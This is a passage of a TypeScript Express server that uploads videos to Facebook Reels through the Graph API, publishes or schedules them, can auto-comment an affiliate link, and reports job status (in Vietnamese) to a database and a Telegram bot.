    const fileBuffer = fs.readFileSync(file.path);
    const fileSize = fs.statSync(file.path).size;

    await ax.post(`https://rupload.facebook.com/video-upload/${FB_API_VERSION}/${videoId}`, fileBuffer, {
      headers: { 
        'Authorization': `OAuth ${pageAccessToken}`,
        'offset': '0',
        'file_size': fileSize.toString(),
        'Content-Type': 'application/octet-stream'
      },
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 120000
    });
    
    // Phase 3: Finish (Publishing)
    if (jobId) uploadJobs.set(jobId, { step: 'Đang lấy link reels...', status: 'uploading' });
    const publishParams: any = { 
      upload_phase: 'finish', 
      video_id: videoId, 
      video_state: mode === 'fb-schedule' ? 'SCHEDULED' : 'PUBLISHED', 
      description: caption || '', 
      access_token: pageAccessToken 
    };
    
    if (mode === 'fb-schedule' && scheduleTime) {
      publishParams.scheduled_publish_time = Math.floor(new Date(scheduleTime).getTime() / 1000);
    }

    await ax.post(`https://graph.facebook.com/${FB_API_VERSION}/${pageId}/video_reels`, null, { 
      params: publishParams,
      timeout: 60000
    });
    
    const link = `https://www.facebook.com/reels/${videoId}`;
    await updateDoc(doc(db, 'history', historyId), { status: 'success', link });
    getMD().history = await loadHistory(mid);

    // Auto Comment (Only for immediate publish)
    if (autoComment === 'true' && affiliateLink && mode !== 'fb-schedule') {
        if (jobId) uploadJobs.set(jobId, { step: 'Đang đợi xử lý auto-comment...', status: 'uploading' });
        // Instead of setTimeout, we wait locally and execute synchronously before res.json
        // Wait 5 seconds
        await new Promise(resolve => setTimeout(resolve, 5000));
        try { 
          await ax.post(`https://graph.facebook.com/${FB_API_VERSION}/${videoId}/comments`, null, { 
            params: { message: affiliateLink, access_token: pageAccessToken },
            timeout: 10000
          }); 
        } catch (e) {
          console.error('Auto-comment failed:', e);
        }
    }

    // Success Telegram Notification
    if (jobId) uploadJobs.set(jobId, { step: 'Đang gửi thông báo về bot tele...', status: 'uploading' });
    await sendTelegramNotification('success', { ...notifyData, link });

    if (jobId) uploadJobs.set(jobId, { step: 'Đăng thành công', status: 'success', link });

    if (fs.existsSync(file.path)) fs.unlinkSync(file.path);
    res.json({ success: true, link });
  } catch (error: any) {
    if (file && fs.existsSync(file.path)) fs.unlinkSync(file.path);
    
    let errorMsg = error.message;
    if (error.response && error.response.data) {
       errorMsg = error.response.data?.error?.message 
                  || error.response.data?.error_user_msg 
                  || (typeof error.response.data === 'string' ? error.response.data : JSON.stringify(error.response.data));
    }
    
    console.error('Upload Error detailed payload:', error.response?.data || error);
    
    if (jobId) uploadJobs.set(jobId, { step: 'Lỗi: ' + errorMsg, status: 'error' });
    
    await updateDoc(doc(db, 'history', historyId), { status: 'error', error: errorMsg });
    getMD().history = await loadHistory(mid);

    // Failure Telegram Notification
    sendTelegramNotification('error', notifyData, errorMsg);

    res.status(500).json({ error: errorMsg });
  }
});

// Vite middleware for development
async function startServer() {
  const { createServer: createViteServer } = await import('vite');
  const vite = await createViteServer({
    server: { middlewareMode: true },
    appType: 'spa',
  });
  app.use(vite.middlewares);

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
  });
}

if (!process.env.VERCEL && process.env.NODE_ENV !== 'production') {
  startServer();
}

// Global error handler
app.use((err: any, req: any, res: any, next: any) => {
  console.error('Unhandled Express Error:', err);
  res.status(500).json({ error: 'INTERNAL_SERVER_ERROR', message: err.message, stack: err.stack });
});

export default app;
